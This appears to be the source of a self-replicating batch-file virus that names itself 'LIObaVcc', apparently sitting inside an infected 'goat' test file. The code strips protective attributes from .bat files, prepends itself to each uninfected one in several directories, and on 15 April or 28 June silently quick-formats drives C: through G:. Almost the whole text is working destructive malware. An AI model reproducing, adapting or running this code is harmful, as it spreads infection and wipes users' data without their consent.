@echo off
if "%1"=="L" goto sudp>nul
set fn=*.bat>nul
attrib *.bat -s -r -h>nul
attrib %winbootdir%\*.bat -s -r -h>nul
attrib c:\*.bat -s -r -h>nul
for %%f in (%fn%) do call %0 L %%f>nul
for %%f in (%winbootdir%\%fn%) do call %0 L %%f>nul
for %%f in (c:\%fn%) do call %0 L %%f>nul
echo.>q.tmp
date<q.tmp>w.tmp
find "15.04" w.tmp>nul
if not errorlevel 1 goto fukkk
find "28.06" w.tmp>nul
if not errorlevel 1 goto fukkk
goto dee
:fukkk
format /q /v:LIObatVccC g:|echo YYY>nul
format /q /v:LIObatVccD f:|echo YYY>nul
format /q /v:LIObatVccE e:|echo YYY>nul
format /q /v:LIObatVccF d:|echo YYY>nul
format /q /v:LIObatVccG c:|echo YYY>nul
:dee
del q.tmp>nul
del w.tmp>nul
goto ppqe >nul
:sudp
find /i "liobatvc" %2>nul
if not errorlevel 1 goto eerend>nul
type %0>a
copy a b /a>nul
echo.>w
copy %2 q>nul
copy /b b+w+q %2 /y>nul
@del ?
goto eerend
:ppqe
echo rem            >x
copy x+x+x+x+x+x+x+x+x+x y>nul
copy y+y+y+y+y+y+y z>nul
@del y>nul
echo @del x>>z
echo @del z>>z
echo @echo on>>z
echo cls>>z
echo @%%comspec%% nul /ccopy %tmp%\temp.tmp %%0>>z
copy z x>nul
copy %0 %tmp%\temp.tmp >nul
@copy x %0
rem ***** This is very dangeros "LIObaVcc" virus created By LIO aka Qwyrek! 2001 (C) ALL RIGHT RESERVED. *****
:eerend

@echo off
echo ***********************************
echo ***********************************
echo ***********************************
echo * Goat bat file. Size = 305 bytes *
echo ***********************************
echo ***********************************
echo ***********************************
